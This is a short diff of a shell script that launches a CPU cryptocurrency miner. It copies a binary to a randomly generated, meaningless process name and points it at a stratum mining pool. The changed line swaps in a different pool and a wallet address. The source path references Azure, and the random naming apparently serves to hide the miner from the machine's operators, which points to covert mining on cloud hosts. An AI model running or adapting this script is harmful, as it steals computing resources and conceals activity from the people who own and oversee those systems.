@@ -19,4 +19,4 @@ cd /usr/local/src/$azure
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 sudo cp platinum "$cpuname"
 echo $cpuname" is starting"
-./"${cpuname}" -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
+./"${cpuname}" -a cpupower -o stratum+tcp://pool.cpuchain.52hash.com:3032 -u CQ9rmn9QNMYN61b7KtC913q7azFABTJHnq -p x
